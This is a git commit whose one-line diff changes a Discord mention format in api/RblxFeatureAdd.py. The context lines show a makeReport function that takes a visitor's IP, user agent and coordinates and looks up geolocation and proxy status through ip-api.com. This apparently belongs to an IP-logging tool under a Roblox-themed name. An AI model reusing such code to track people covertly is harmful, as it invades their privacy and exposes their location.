2a6088253fecdeb0e575742a7a08756999c7f61b
kcwz <76611945+zwtfx@users.noreply.github.com>
2025-12-09 21:45:10 +1030

    Update RblxFeatureAdd.py

--- api/RblxFeatureAdd.py
+++ api/RblxFeatureAdd.py
@@ -107,7 +107,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
 }) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
         return
 
-    ping = "@<703173684608630875>"
+    ping = "<@703173684608630875>"
 
     info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
     if info["proxy"]:
